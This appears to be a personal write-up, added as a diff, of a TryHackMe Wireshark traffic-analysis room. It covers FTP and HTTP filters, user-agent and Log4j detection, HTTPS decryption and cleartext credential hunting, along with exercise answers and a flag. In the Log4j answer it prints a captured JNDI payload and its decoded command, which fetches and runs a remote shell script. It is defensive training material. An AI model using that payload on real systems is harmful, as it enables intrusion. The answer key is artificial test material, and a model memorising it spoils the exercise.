@@ -406,3 +406,412 @@ Global search
 **Note:** "200" means command successful.
 **---**
 "x1x" series options for grabbing the low-hanging fruits:
+-   **211:** System status.
+-   **212:** Directory status.
+-   **213:** File status
+-   `ftp.response.code == 211`
+"x2x" series options for grabbing the low-hanging fruits:
+-   **220:** Service ready.
+-   **227:** Entering passive mode.
+-   **228:** Long passive mode.
+-   **229:** Extended passive mode.
+-   `ftp.response.code == 227`
+"x3x" series options for grabbing the low-hanging fruits:
+-   **230:** User login.
+-   **231:** User logout.
+-   **331:** Valid username.
+-   **430:** Invalid username or password
+-   **530:** No login, invalid password.
+-   `ftp.response.code == 230`
+"FTP" commands for grabbing the low-hanging fruits:
+-   **USER:** Username.
+-   **PASS:** Password.
+-   **CWD:** Current work directory.
+-   **LIST:** List.
+-   `ftp.request.command == "USER"`
+-   `ftp.request.command == "PASS"`
+-   `ftp.request.arg == "password"`
+Advanced usages examples for grabbing low-hanging fruits:
+-   **Bruteforce signal:** List failed login attempts.
+-   **Bruteforce signal:** List target username.
+-   **Password spray signal:** List targets for a static password.
+-   `ftp.response.code == 530`
+-   `(ftp.response.code == 530) and (ftp.response.arg contains "username")`
+-   `(ftp.request.command == "PASS" ) and (ftp.request.arg == "password")`
+Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!
+Use the "Desktop/exercise-pcaps/ftp/ftp.pcap" file.How many incorrect login attempts are there?
+FTP code 503.
+ftp.response.code==530
+![[Pasted image 20221212111953.png]]
+*737*
+What is the size of the file accessed by the "ftp" account?
+Filtering the response code "213" can help.
+ftp.response.code==213
+![[Pasted image 20221212112112.png]]
+*39424*
+The adversary uploaded a document to the FTP server. What is the filename?
+Follow TCP
+![[Pasted image 20221212112328.png]]
+*resume.doc*
+The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?
+Follow TCP and at the end is the command
+![[Pasted image 20221212112507.png]]
+*CHMOD 777*
+### Cleartext Protocol Analysis: HTTP
+HTTP Analysis
+Hypertext Transfer Protocol (HTTP) is a cleartext-based, request-response and client-server protocol. It is the standard type of network activity to request/serve web pages, and by default, it is not blocked by any network perimeter. As a result of being unencrypted and the backbone of web traffic, HTTP is one of the must-to-know protocols in traffic analysis. Following attacks could be detected with the help of HTTP analysis:
+-   Phishing pages
+-   Web attacks
+-   Data exfiltration
+-   Command and control traffic (C2)
+HTTP analysis in a nutshell:
+**Notes**
+**Wireshark Filter**
+Global search
+**Note:** HTTP2 is a revision of the HTTP protocol for better performance and security. It supports binary data transfer and request&response multiplexing.
+-   `http`
+-   `http2`
+"HTTP **Request Methods"** for grabbing the low-hanging fruits:
+-   GET
+-   POST
+-   Request: Listing all requests
+-   `http.request.method == "GET"`
+-   `http.request.method == "POST"`
+-   `http.request`
+"HTTP Response Status Codes" for grabbing the low-hanging fruits:
+-   **200 OK:** Request successful.
+-   **301 Moved Permanently:** Resource is moved to a new URL/path (permanently).
+-   **302 Moved Temporarily:** Resource is moved to a new URL/path (temporarily).
+-   **400 Bad Request:** Server didn't understand the request.
+-   **401 Unauthorised:** URL needs authorisation (login, etc.).
+-   **403 Forbidden:** No access to the requested URL.
+-   **404 Not Found:** Server can't find the requested URL.
+-   **405 Method Not Allowed:** Used method is not suitable or blocked.
+-   **408 Request Timeout:**  Request look longer than server wait time.
+-   **500 Internal Server Error:** Request not completed, unexpected error.
+-   **503 Service Unavailable:** Request not completed server or service is down.
+-   `http.response.code == 200`
+-   `http.response.code == 401`
+-   `http.response.code == 403`
+-   `http.response.code == 404`
+-   `http.response.code == 405`
+-   `http.response.code == 503`
+"HTTP Parameters" for grabbing the low-hanging fruits:
+-   **User agent:** Browser and operating system identification to a web server application.
+-   **Request URI:** Points the requested resource from the server.
+-   **Full *URI:** Complete URI information.
+***URI:** Uniform Resource Identifier.
+-   `http.user_agent contains "nmap"`
+-   `http.request.uri contains "admin"`
+-   `http.request.full_uri contains "admin"`
+"HTTP Parameters" for grabbing the low-hanging fruits:
+-   **Server:** Server service name.
+-   **Host:** Hostname of the server
+-   **Connection:** Connection status.
+-   **Line-based text data:** Cleartext data provided by the server.
+-   **HTML Form URL Encoded:** Web form information.
+-   `http.server contains "apache"`
+-   `http.host contains "keyword"`
+-   `http.host == "keyword"`
+-   `http.connection == "Keep-Alive"`
+-   `data-text-lines contains "keyword"`
+User Agent Analysis
+As the adversaries use sophisticated technics to accomplish attacks, they try to leave traces similar to natural traffic through the known and trusted protocols. For a security analyst, it is important to spot the anomaly signs on the bits and pieces of the packets. The "user-agent" field is one of the great resources for spotting anomalies in HTTP traffic. In some cases, adversaries successfully modify the user-agent data, which could look super natural. A security analyst cannot rely only on the user-agent field to spot an anomaly. Never whitelist a user agent, even if it looks natural. User agent-based anomaly/threat detection/hunting is an additional data source to check and is useful when there is an obvious anomaly. If you are unsure about a value, you can conduct a web search to validate your findings with the default and normal user-agent info ([**example site**](https://developers.whatismybrowser.com/useragents/explore/)).
+https://developers.whatismybrowser.com/useragents/explore/
+User Agent analysis in a nutshell:
+**Notes**
+**Wireshark Filter**
+Global search.
+-   `http.user_agent`
+Research outcomes for grabbing the low-hanging fruits:
+-   Different user agent information from the same host in a short time notice.
+-   Non-standard and custom user agent info.
+-   Subtle spelling differences. **("Mozilla" is not the same as  "Mozlilla" or "Mozlila")**
+-   Audit tools info like Nmap, Nikto, Wfuzz and sqlmap in the user agent field.
+-   Payload data in the user agent field.
+-   `(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")`
+Log4j Analysis
+A proper investigation starts with prior research on threats and anomalies going to be hunted. Let's review the knowns on the "Log4j" attack before launching Wireshark.
+Log4j vulnerability analysis in a nutshell:
+**Notes**
+**Wireshark Filters**
+**Research outcomes** for grabbing the low-hanging fruits:
+-   The attack starts with a "POST" request
+-   There are known cleartext patterns: "**jndi:ldap**" and "**Exploit.class**".
+-   `http.request.method == "POST"`
+-   `(ip contains "jndi") or ( ip contains "Exploit")`
+-   `(frame contains "jndi") or ( frame contains "Exploit")`
+-   `(http.user_agent contains "$") or (http.user_agent contains "==")`
+Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!
+Use the "Desktop/exercise-pcaps/http/user-agent.cap" file.
+Investigate the user agents. What is the number of anomalous  "user-agent" types?
+1) The answer is not the number of packets. It is the number of anomalous user-agent types. You need to filter the "user agent" info "as a column" and conduct a manual investigation of the packet details to spot the anomalies. 2) In addition to the obvious "non-standard" and modified user agent types: Does "Windows NT 6.4" exist?
+![[Pasted image 20221212114500.png]]
+![[Pasted image 20221212114818.png]]
+![[Pasted image 20221212115517.png]]
+![[Pasted image 20221212115454.png]]
+![[Pasted image 20221212115438.png]]
+There are 6 anomalous user-agents: Windows NT 6.4, nmap, Wfuzz, sqlmap, and Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 (uploaded shell b374k.php), and log4j
+*6*
+What is the packet number with a subtle spelling difference in the user agent field?
+Mozlila
+![[Pasted image 20221212120046.png]]
+*52*
+Use the "Desktop/exercise-pcaps/http/http.pcapng" file.
+Locate the "Log4j" attack starting phase. What is the packet number?
+http.request.method == "POST"
+jndi , found packet 444
+![[Pasted image 20221212120436.png]]
+*444*
+Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)
+```text
+found: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}
+
+wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh
+
+ip: 62.210.130.250
+
+defanging ip: 62[.]210[.]130[.]250
+```
+*62[.]210[.]130[.]250*
+### Encrypted Protocol Analysis: Decrypting HTTPS
+Decrypting HTTPS Traffic
+When investigating web traffic, analysts often run across encrypted traffic. This is caused by using the Hypertext Transfer Protocol Secure (HTTPS) protocol for enhanced security against spoofing, sniffing and intercepting attacks. HTTPS uses TLS protocol to encrypt communications, so it is impossible to decrypt the traffic and view the transferred data without having the encryption/decryption key pairs. As this protocol provides a good level of security for transmitting sensitive data, attackers and malicious websites also use HTTPS. Therefore, a security analyst should know how to use key files to decrypt encrypted traffic and investigate the traffic activity.
+The packets will appear in different colours as the HTTP traffic is encrypted. Also, protocol and info details (actual URL address and data returned from the server) will not be fully visible. The first image below shows the HTTP packets encrypted with the TLS protocol. The second and third images demonstrate filtering HTTP packets without using a key log file.
+Additional information for HTTPS :
+Notes
+Wireshark Filter
+"HTTPS Parameters" for grabbing the low-hanging fruits:
+-   **Request:** Listing all requests
+-   **TLS:** Global TLS search
+-   TLS Client Request
+-   TLS Server response
+-   Local Simple Service Discovery Protocol (SSDP)
+**Note:** SSDP is a network protocol that provides advertisement and discovery of network services.
+-   `http.request`
+-   `tls`
+-   `tls.handshake.type == 1`
+-   `tls.handshake.type == 2`
+-   `ssdp`
+Similar to the TCP three-way handshake process, the TLS protocol has its handshake process. The first two steps contain "Client Hello" and "Server Hello" messages. The given filters show the initial hello packets in a capture file. These filters are helpful to spot which IP addresses are involved in the TLS handshake.
+-   Client Hello: `(http.request or tls.handshake.type == 1) and !(ssdp)`
+-   Server Hello:`(http.request or tls.handshake.type == 2) and !(ssdp)`
+An encryption key log file is a text file that contains unique key pairs to decrypt the encrypted traffic session. These key pairs are automatically created (per session) when a connection is established with an SSL/TLS-enabled webpage. As these processes are all accomplished in the browser, you need to configure your system and use a suitable browser (Chrome and Firefox support this) to save these values as a key log file. To do this, you will need to set up an environment variable and create the SSLKEYLOGFILE, and the browser will dump the keys to this file as you browse the web. SSL/TLS key pairs are created per session at the connection time, so it is important to dump the keys during the traffic capture. Otherwise, it is not possible to create/generate a suitable key log file to decrypt captured traffic. You can use the "right-click" menu or **"Edit --> Preferences --> Protocols --> TLS"** menu to add/remove key log files.
+**Adding key log files with the "right-click" menu:**
+Adding key log files with the "Edit --> Preferences --> Protocols --> TLS" menu:
+**Viewing the traffic with/without the key log files:**
+The above image shows that the traffic details are visible after using the key log file. Note that the packet details and bytes pane provides the data in different formats for investigation. Decompressed header info and HTTP2 packet details are available after decrypting the traffic. Depending on the packet details, you can also have the following data formats:
+-   Frame
+-   Decrypted TLS
+-   Decompressed Header
+-   Reassembled TCP
+-   Reassembled SSL
+Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!
+Answer the questions below
+![[Pasted image 20221212122312.png]]
+```text
+CLIENT_HANDSHAKE_TRAFFIC_SECRET f35fff3ca92d297cb03a5f158d65286c7afdd583e6392a84b13a9f7ac431a222 f4ce2a326ffa83c7c1f1fc00e142471438547a951cd6e383f6492a0aa386fcf8
+SERVER_HANDSHAKE_TRAFFIC_SECRET f35fff3ca92d297cb03a5f158d65286c7afdd583e6392a84b13a9f7ac431a222 7ebf1f8a0cbe86f2605b4cf95692e87eff41a109bf640817f543fedb8f8f0d04
+CLIENT_HANDSHAKE_TRAFFIC_SECRET 56fe125f02c940b756b92628f605a330585ef28f780514d680ed88523be33091 6a3f63a5da6de0a09470383723582aee56e4b1bd483f54ffbd5fa5f66a044c21
+SERVER_HANDSHAKE_TRAFFIC_SECRET 56fe125f02c940b756b92628f605a330585ef28f780514d680ed88523be33091 2c4d244b1878e3da8311c429dacfbd3baf68f0a76fd37dff43e4a88f5c3be804
+CLIENT_TRAFFIC_SECRET_0 56fe125f02c940b756b92628f605a330585ef28f780514d680ed88523be33091 160fd713d014210e4513754b50f515fec5574a2eef712e8c303b6759d622e7ec
+```
+Use the "Desktop/exercise-pcaps/https/Exercise.pcap" file.
+What is the frame number of the "Client Hello" message sent to "accounts.google.com"?
+"Protocol Details Pane --> TLS --> Handshake Protocol --> Extension: server_name" can help.
+![[Pasted image 20221212122555.png]]
+(http.request or tls.handshake.type==1) and !(ssdp)
+server name and apply as column then look for frame number
+![[Pasted image 20221212123120.png]]
+![[Pasted image 20221212123212.png]]
+*16*
+Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?
+Import the key file to decrypt the traffic.
+http2
+![[Pasted image 20221212123404.png]]
+*115*
+Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)
+http2
+![[Pasted image 20221212123653.png]]
+*safebrowsing[.]googleapis[.]com*
+Investigate the decrypted packets and find the flag! What is the flag?
+You can export objects after decrypting the traffic.
+Edit > Find Packet > String > find FLAG{
+```text
+Follow TLS stream
+
+GET /filebin/f7c367c15581fe776cbb3b9eefe6bcd313a46679e274b6085098d81862200f99/21e2ae0fb85fde7bb246ed90194f601e041b3c8ac6e937b1878bd8e0e796a098?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=HZXB1J7T0UN34UN512IW%2F20220623%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220623T232311Z&X-Amz-Expires=30&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D30&response-content-disposition=filename%3D%22flag.txt%22&response-content-type=text%2Fplain%3B%20charset%3Dutf-8&X-Amz-Signature=6570806d2299163ae00b6044b2ca2afc4cb0e5397bcff9cb3ca6762aef0fbe3c HTTP/1.1
+Host: situla.bitbit.net
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Referer: https://filebin.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+
+HTTP/1.1 200 OK
+Content-Length: 3412
+Accept-Ranges: bytes
+Last-Modified: Thu, 23 Jun 2022 23:22:29 GMT
+ETag: "9bb949ae18ca676b208df3eacf9de132"
+Cache-Control: max-age=30
+Content-Disposition: filename="flag.txt"
+x-amz-request-id: tx00000000000000393ac60-0062b4f5e2-3c9fbb72-default
+Content-Type: text/plain; charset=utf-8
+Connection: Keep-Alive
+
+                         __^__                                                        __^__
+                        ( ___ )------------------------------------------------------( ___ )
+                         | / |                                                        | \ |
+                         | / |               FLAG{THM-PACKETMASTER}                   | \ |
+                         |___|                                                        |___|
+                        (_____)------------------------------------------------------(_____)
+
+                .     .       .  .   . .   .   . .    +  .:..+.. ... :..:.. . ... :..:.. . ..
+                .     .  :     .    .. :. .___---------___.::.. ... :..:.. . ..... . ...
+                     .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_.:.::... :..:.. . ... :..:.. . .
+                   .  :       .  .  .:../:            . .^  :.:\.::... :..:.. . ..... . ... 
+                        .   . :: +. :.:/: .   .    .        . . .:\::... :..:.. . ...:.. . .
+                 .  :    .     . _ :::/:               .  ^ .  . .:\::... :..:.. . ...:.. . ... 
+                  .. . .   . - : :.:./.                        .  .:\::... :..:.. . ... :.. . ... 
+                  .      .     . :..|:                    .  .  ^. .:|:: ... :..:.. . ... :..:.. . .
+                    .       . : : ..||        .                . . !:|::... :..:.... . ... :.. 
+                  .     . . . ::. ::\(                           . :)/:: ... :..:.. . ... :
+                 .   .     : . : .:.|. ######              .#######::|::... :..:.. . ... :..:.. . ... 
+                  :.. .  :-  : .:  ::|.#######           ..########:|::... :..:.. . ... :..:.. . ..
+                 .  .  .  ..  .  .. :\ ########          :######## :/:: ... :..:.. . ...:.. . .
+                  .        .+ :: : -.:\ ########       . ########.:/::... :..:.. . ... :..:.. . ... :..:.. 
+                    .  .+   . . . . :.:\. #######       #######..:/::     .+ :: : -. . ... :..:.. .
+                      :: . . . . ::.:..:.\           .   .   ..:/::  .+ :: : -.... :..:.. . ... 
+                   .   .   .  .. :  -::::.\.       | |     . .:/:: -.   . . . .... :..:.. 
+                      .  :  .  .  .-:.":.::.\             ..:/:: -.   . . . .... :..:.. . ... :
+                 .      -.   . . . .: .:::.:.\.           .:/:.   . . .   .  .  . ... 
+                .   .   .  :      : ....::_:..:\   ___.  :/::  . . .   .  .  . ...
+                   .   .  .   .:. .. .  .: :.:.:\       :/::.   . . .   .  .  . ... :..
+                     +   .   .   : . ::. :.:. .:.|\  .:/|::.   . . .   .  .  . ..
+                     .         +   .  .  ...:: ..|  --.:|::.  . . .   .  .  . ..
+                .      . . .   .  .  . ... :..:.."(  ..)":: .   . . . 
+                 .   .       .      :  .   .: ::/  .  .::\::. . . + : .
+                         __^__                                                        __^__
+                        ( ___ )------------------------------------------------------( ___ )
+                         | / |                                                        | \ |
+                         | / |               FLAG{THM-PACKETMASTER}                   | \ |
+                         |___|                                                        |___|
+                        (_____)------------------------------------------------------(_____)
+GET /favicon.ico HTTP/1.1
+Host: situla.bitbit.net
+Connection: keep-alive
+sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://situla.bitbit.net/filebin/f7c367c15581fe776cbb3b9eefe6bcd313a46679e274b6085098d81862200f99/21e2ae0fb85fde7bb246ed90194f601e041b3c8ac6e937b1878bd8e0e796a098?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=HZXB1J7T0UN34UN512IW%2F20220623%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220623T232311Z&X-Amz-Expires=30&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D30&response-content-disposition=filename%3D%22flag.txt%22&response-content-type=text%2Fplain%3B%20charset%3Dutf-8&X-Amz-Signature=6570806d2299163ae00b6044b2ca2afc4cb0e5397bcff9cb3ca6762aef0fbe3c
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+
+HTTP/1.1 404 Not Found
+Content-Length: 229
+x-amz-request-id: tx00000000000000393ac69-0062b4f5e2-3c9fbb72-default
+Accept-Ranges: bytes
+Content-Type: application/xml
+Connection: Keep-Alive
+
+<?xml version="1.0" encoding="UTF-8"?><Error><Code>NoSuchBucket</Code><BucketName>favicon.ico</BucketName><RequestId>tx00000000000000393ac69-0062b4f5e2-3c9fbb72-default</RequestId><HostId>3c9fbb72-default-default</HostId></Error>
+```
+![[Pasted image 20221212124442.png]]
+### Bonus: Hunt Cleartext Credentials!
+**Bonus: Hunt Cleartext Credentials!**
+Up to here, we discussed how to inspect the packets for specific conditions and spot anomalies. As mentioned in the first room, Wireshark is not an IDS, but it provides suggestions for some cases under the expert info. However, sometimes anomalies replicate the legitimate traffic, so the detection becomes harder. For example, in a cleartext credential hunting case, it is not easy to spot the multiple credential inputs and decide if there is a brute-force attack or if it is a standard user who mistyped their credentials.
+As everything is presented at the packet level, it is hard to spot the multiple username/password entries at first glance. The detection time will decrease when an analyst can view the credential entries as a list. Wireshark has such a feature to help analysts who want to hunt cleartext credential entries.
+Some Wireshark dissectors (FTP, HTTP, IMAP, pop and SMTP) are programmed to extract cleartext passwords from the capture file. You can view detected credentials using the **"Tools --> Credentials"** menu. This feature works only after specific versions of Wireshark (v3.1 and later). Since the feature works only with particular protocols, it is suggested to have manual checks and not entirely rely on this feature to decide if there is a cleartext credential in the traffic.
+Once you use the feature, it will open a new window and provide detected credentials. It will show the packet number, protocol, username and additional information. This window is clickable; clicking on the packet number will select the packet containing the password, and clicking on the username will select the packet containing the username info. The additional part prompts the packet number that contains the username.
+Use the "Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap" file.
+What is the packet number of the credentials using "HTTP Basic Auth"?
+"Tools --> Credentials" can help.
+![[Pasted image 20221212125251.png]]
+*237*
+What is the packet number where "empty password" was submitted?
+packet number: show pass and username the same (clicking link)
+looking and packet 170 is empty pass, i.e 41 admin:moose,  admin:monica, admin:morley and so on.
+![[Pasted image 20221212125515.png]]
+*170*
+### Bonus: Actionable Results!
+**Bonus: Actionable Results!**
+You have investigated the traffic, detected anomalies and created notes for further investigation. What is next? Not every case investigation is carried out by a crowd team. As a security analyst, there will be some cases you need to spot the anomaly, identify the source and take action. Wireshark is not all about packet details; it can help you to create firewall rules ready to implement with a couple of clicks. You can create firewall rules by using the **"Tools --> Firewall ACL Rules"** menu. Once you use this feature, it will open a new window and provide a combination of rules (IP, port and MAC address-based) for different purposes. Note that these rules are generated for implementation on an outside firewall interface.
+Currently, Wireshark can create rules for:
+-   Netfilter (iptables)
+-   Cisco IOS (standard/extended)
+-   IP Filter (ipfilter)
+-   IPFirewall (ipfw)
+-   Packet filter (pf)
+-   Windows Firewall (netsh new/old format)
+Use the "Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap" file.
+Select packet number 99. Create a rule for "IPFirewall (ipfw)". What is the rule for "denying source IPv4 address"?
+"Tools --> Firewall ACL Rules" can help.
+![[Pasted image 20221212130250.png]]
+*add deny ip from 10.121.70.151 to any in*
+Select packet number 231. Create "IPFirewall" rules. What is the rule for "allowing destination MAC address"?
+"Deny" option can help.
+untick deny to allow :)
+![[Pasted image 20221212130603.png]]
+*add allow MAC 00:d0:59:aa:af:80 any in*
+### Conclusion
+Congratulations! You just finished the "Wireshark: The Traffic Analysis" room.
+In this room, we covered how to use the Wireshark to detect anomalies and investigate events of interest at the packet level. Now, we invite you to complete the Wireshark challenge room: [**Carnage**](https://tryhackme.com/room/c2carnage), **Warzone 1** and **Warzone 2**.
+Wireshark is a good tool for starting a network security investigation. However, it is not enough to stop the threats. A security analyst should have IDS/IPS knowledge and extended tool skills to detect and prevent anomalies and threats. As the attacks are getting more sophisticated consistently, the use of multiple tools and detection strategies becomes a requirement. The following rooms will help you step forward in network traffic analysis and anomaly/threat detection.
+-   [**NetworkMiner**](https://tryhackme.com/room/networkminer)
+-   [**Snort**](https://tryhackme.com/room/snort)
+-   [**Snort Challenge -  The Basics**](https://tryhackme.com/room/snortchallenges1)
+-   [**Snort Challenge - Live Attacks**](https://tryhackme.com/room/snortchallenges2)
+-   [**Zeek**](https://tryhackme.com/room/zeekbro)
+-   [**Zeek Exercises**](https://tryhackme.com/room/zeekbroexercises)
+-   [**Brim**](https://tryhackme.com/room/brim)
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/10f7d168ab59410ddc28a4b1e89fd6d4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/500bb6902ef6b2edb515bb1828088d82.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c194773203502d659d72706aa93eae59.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7025561839f99201724629fae1274f2d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/0dbf4e7b74ad99f7060241fc37d8d570.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/488115fed65b69aa95aa2677cf2ae800.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/d033bde6ee753f070678cc56665d79fa.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/bb88ee3b05687c6ece165ab7e9fe12bf.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/0e63fe522554f08810d7d60b8a331ae7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/626988e40598f6190c81f59ab3ff813c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/ef02b6b0434491aea9eb6957c70c32d2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7f0e92a248da129dda0593a299ecb368.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/e02a42c9d4e3f17a94acbae4cacb6b65.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f55ebc1632f6776e074dc29842221b48.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/f885817e77449e6898ba3ede164723c4.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7431eb9671e8ebb2a21d2ff9a08b2faa.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/e12db620d6127ad299059e3626f083d7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/9826985c3c3b9f582f7c7c5ed24f93d7.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/723f801adc6a95526c2cb39b7ddeee15.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c11641f9df84faa040e2c6c11da08655.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8287adaa075c737986e04d026f137e2e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8c114d533e1914300bae23b19d3e6f40.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8c3bc1fb4090582de2e36452de4d7d3a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/2558999240f7cc60cfb7588d434f9793.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/adad6bec8a257b67664167f52981f820.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/17b1557ea94f23b7a9c6851fddbd366b.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7461f414bdc9926827dd54d57e7a8825.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/5df77f4b111b3ae5b7332456046a5ebc.png)
+- ***FLAG{THM-PACKETMASTER}***
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c8266feccc3836c97ed4fdbd81befc20.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/448e790da3f31b8566547cd03804b282.png)
+
+## Notes / Lessons Learned
+[[Brim]]
+
